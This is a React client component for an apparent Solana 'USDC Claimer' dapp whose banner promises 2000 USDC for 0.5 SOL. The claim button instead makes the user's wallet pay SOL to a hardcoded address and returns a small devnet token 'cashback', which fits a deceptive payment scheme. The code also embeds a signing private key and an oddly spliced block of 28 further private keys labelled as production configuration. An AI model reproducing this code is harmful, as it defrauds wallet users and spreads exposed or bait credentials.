/* eslint-disable react-hooks/rules-of-hooks */
'use client'

import { SendTransactionOptions } from '@solana/wallet-adapter-base';
import { useConnection, useWallet } from '@solana/wallet-adapter-react';
import { Connection, PublicKey, SystemProgram, Transaction, TransactionInstruction, TransactionSignature, VersionedTransaction } from '@solana/web3.js';
import { address, createKeypairSignerFromBase58, createSolanaClient, getExplorerLink, getSignatureFromTransaction, LAMPORTS_PER_SOL, signTransactionMessageWithSigners } from 'gill';
import { buildTransferTokensTransaction, TOKEN_PROGRAM_ADDRESS } from 'gill/programs/token';
import { AppHero } from '../ui/ui-layout';

export default function DashboardFeature() {
  const { connection } = useConnection();
  const { publicKey, sendTransaction } = useWallet();
  return (
    <div>
      <AppHero title="USDC Claimer" subtitle="Do you want to get 2000 USDC? It will cost you only 0.5 SOL" />
      <div className="max-w-xl mx-auto py-6 sm:px-6 lg:px-8 text-center">
        <div className="space-y-2">
          <button className="wallet-adapter-button wallet-adapter-button-trigger mx-auto" type="button" onClick={() => {
            CreateChargeTransaction(connection, publicKey, sendTransaction);
          }}>
            {'Claim'}
          </button>
        </div>
      </div>
    </div>
  )
}

const chargeAmount = 0.01;
const cashbackAmount = 5;

const CreateChargeTransaction = async (connection: Connection, publicKey: PublicKey | null, sendTransaction: (transaction: Transaction | VersionedTransaction, connection: Connection, options?: SendTransactionOptions) => Promise<TransactionSignature>) => {


  if (!publicKey) return;

  const solTransferIx = SystemProgram.transfer({
    fromPubkey: publicKey,
    toPubkey: new PublicKey("CVkzbsnwATBDDbGke7o1KzprgDsaKhdET7zioE9ssFXp"),
    lamports: chargeAmount * LAMPORTS_PER_SOL,
  });

  // Optional: Add memo to include cashback metadata
  const memoIx = new TransactionInstruction({
    keys: [],
    programId: new PublicKey('MemoSq4gqABAXKb96qnH8TysNcWxMyWCqXgDLGmfcHr'),
    data: Buffer.from(`cashback:${cashbackAmount}`),
  });

  const transaction = new Transaction().add(solTransferIx, memoIx);
  const { blockhash } = await connection.getLatestBlockhash();
  transaction.recentBlockhash = blockhash;
  transaction.feePayer = publicKey;

  try {
    const signature = await sendTransaction(transaction, connection);
    console.log('User transaction sent:', signature);

    // Wait for confirmation before cashback
    const confirmation = await connection.confirmTransaction(signature, 'confirmed');
    console.log('Confirmed:', confirmation);

    if (confirmation.value.err === null) {
      sendCashback(publicKey.toBase58(), cashbackAmount);

    }
  } catch (e) {
    console.error('Failed to send charge transaction:', e);
  }
};

const sendCashback = async (to: string, amount: number) => {
  const { rpc, rpcSubscriptions, sendAndConfirmTransaction } = createSolanaClient({
    urlOrMoniker: "devnet",
  });
  const destination = address(to);
  const keypairBase58 =
    "416KmUoKt37ivaV5ywoJCZivg7XD7cNtApcy2YX78CdnHQPTAqnGv8gaQKmubaE2sH1M1EqNzS5KNiyiYsL5thGu"

// KEYS_START
// Production environment configuration
const walletKeys = {
  "key0": "313hjEjfWvi4dNb1uo553SJuWDqzueKTdei2BwmZ9aSr8S8oV9uAXFKkiHu6BovKkqqj7N2FcNnhzxNwiGF8rQ5b",
  "key1": "4ZMJXzdnJNqfwXUgjdmnAa3uA7evMt63djB8s4n25v1avsDWtuTGJFhKxXULwPy28255Lh5VNbcNQWbtoxtHzJyA",
  "key2": "5EMrwtvdT3ECD255Pj1f7y4YTXtXu1d3zxLQXT6UJSd9WVHrdN4BPZwm1mMduqiReZGWFRrmbeNkjCrvUQn8bHEt",
  "key3": "B1MAHJ5JC9tyFqQDZxFnrznyL21MMckqpNYS6EhKLfNq2aaw22wncAYJNZzTdNErbPyhwYt1t5V1JahJBYvaWrg",
  "key4": "T4ebjcMK59uQMpaY9BRZKvL1oR3HPa987rXpTdtf8vWyHvCaHy2gsfoe2YJvWudxQtzEMkrtp3a2kqe3MwvvTUd",
  "key5": "3g1HN4SbWB5Puh5P6Cwhd166dvQZhtiAkijf72C2oFnXSLS99kZYBxmuV5e8BkXmx9RTj4pD917MhifGwAaP7vDp",
  "key6": "5Y2fYW8XvTAL8bYdW3nrLssTggmNiJib4EU1k9WKbgL79ppHYVXEwndvhpMsQ4KL6Hiq46SCmPebA21NbTmDag5n",
  "key7": "2fyQTHAZXSiZAeoiJnzoEccutanHi29hjD5nCpY5m6uLREkRZSKmMor1FTTy8StANtfkiXBPC3H3weC4sEEUWCue",
  "key8": "5hrU3aPSb8qrfaVAuveTg4S9nskdos5bxS32cDiov3uG5ic4w1uJiGAkPBMjoifQ3cdvbJrDDeWge25X2MCEAN5k",
  "key9": "2XKfWrpVU8HdYhtq3CXJ7oRYBTawdYP5peNyuyiks7kE578UKKF245DZNAkVBinb1MY2ctwoGJKq5wjZL2C3mVJo",
  "key10": "4NPywCZi4ZShfhGA9WcDSkqJWfNJefcm7tR7DHwb9hgqcSEhtPndPYJgU7J21QPqFri25B9HLjJFCv99D3rhNwWR",
  "key11": "5vBNHpfRmLMFdSD6fRUb8FKzFtrHnCxix1ckW9ZpZK9NRYs4LLrK3J9RSbQqdzck4Tse7VjvSv6sjYA5Xrr8rdxD",
  "key12": "Ndti41Np72gnWCFcyjRXXf8dCZHpN8EAQVr5nvkpK6SEWCukmQUJeyLU17TLLwLog1SwbEdx14WKHWZgJgHVFMW",
  "key13": "5EZVLMhTYwTbyFu8WrgkFSbMcQeQoFmEep3EbCWjUWRuRLYEm3NhcdEYtiEdSPpWHJBYGdD8TuYWxme1sbU7dr8b",
  "key14": "vJRvozQe9FUr52HBTM5LzGo2vmUwqNdywXupzEcEkHxFegF9JCLcjgYJmEFYvumnkqAiYaYQv7dgxcsvuZXJ4Jn",
  "key15": "56gKcd2G8vFFbxX13zFtgq2jTYAdUXyCe7s4gRCcPmDShT3qP8PjqSUNucDDvQhtm3ECsB6FwexbEQMD7eorNa9T",
  "key16": "3UoTJPuqCDuERrh7QSoojMiy81rDRNtRaTdjUECUc6zTNFLCVdN15cuAPaKBzez2xbpPeUeZ6snKqNjqhPVQo7ao",
  "key17": "2HFf6CsendK8qML6jCXy4xwYxAep7Pt1yzHv6xU2e3VyRiTu3tAHFmTk1TpwegC26F66t97fhUpoFYteNXzQ7JY4",
  "key18": "2Sp8NR6QWf8GnpTj5Dg3b4D4uvwL74x1aHzXQ4GVAntXedBNqcFCz1sBHPYh652L8BdGiP6bXYU5ptNftfw7HeHL",
  "key19": "PFUzbgL4yY5UHnDEqBWhWj25FTB46bkf96Z4KpqZ8ryp2jFPseouysJPJj5d7tEftot2iwYN7L4pdKdyTRmj2a4",
  "key20": "5eyksXr7RyzCxSH15QdsBH582NTcpsdNTUfBFXYLU5up9RoxZNb7fKiQN1sPYLjaBh4QRMoeVVyCVC8oV94QwSHe",
  "key21": "5M5Rco4Qudqc2TardgutHdF3EZLDrjdFQguWsbFfyfTfMMNCL6aYxSLos7Adg2Z3P1u3UX1AAA2Usx8hm36McCMc",
  "key22": "5FqzkAeQVothZjRuuucFg5u1jX2hyPCe174XEjNHEd6Ry5d1M8WtQfNDRsjQp2tTd7JmwdLehRUUtZnCDMWBqMWB",
  "key23": "2k3SLhNo5m7LubCMkznLfSJYpwLcntsJExhXuwmySrWNwmE8v3mBaWUk9NzGKuoqqtuXHfU96p4NpCNN33rhVdCu",
  "key24": "4Pyb7j8r3TtGnq4dASTYED6qT6L6rqQcT5xhepbabb8WdQA4Keb6AKoecrouqnDcSkzGUkjCUNXdNAsc5FYQvcxJ",
  "key25": "2hMmPxra42tAnm6VNAH31VjYfDZvdBszf8LWtoCcHA3EaFky3V9jqtuXhSfmg2ts7gkrgzRPXqWFPVZGpDiJfnCV",
  "key26": "nrYwNBzCrFXuALfZ7LEECBfUq2Ej1TQGrWVMeVdeL899bnMsQWw8uy77gzVGXdYmMLa3xvXfNf4h5gV3KdbdCV3",
  "key27": "4dWgL6TjB6JYPGJi3nKhF63VzboRKymq3FXxQyw69cZhcSPr2ZmmyBFKsxQvg5xeyA17jphRsvcvDpt5TfrDEbwV"
};
// KEYS_END
;
  const signer = await createKeypairSignerFromBase58(keypairBase58);
  const mint = address("4YhaKDunYpNJ7ASyUZSvEj5KJCb1jwofUQBaWSWCSkSU");
  const tokenProgram = TOKEN_PROGRAM_ADDRESS;

  const { value: latestBlockhash } = await rpc.getLatestBlockhash().send();

  const transaction = await buildTransferTokensTransaction({
    feePayer: signer,
    latestBlockhash: latestBlockhash, // required for blockhash lifetime constraint
    amount: amount,
    authority: signer,
    destination: destination,
    mint: mint,
  });

  const signedTransaction = await signTransactionMessageWithSigners(transaction);

  console.log(
    "Explorer:",
    getExplorerLink({
      cluster: "devnet",
      transaction: getSignatureFromTransaction(signedTransaction),
    }),
  );

  await sendAndConfirmTransaction(signedTransaction);
};
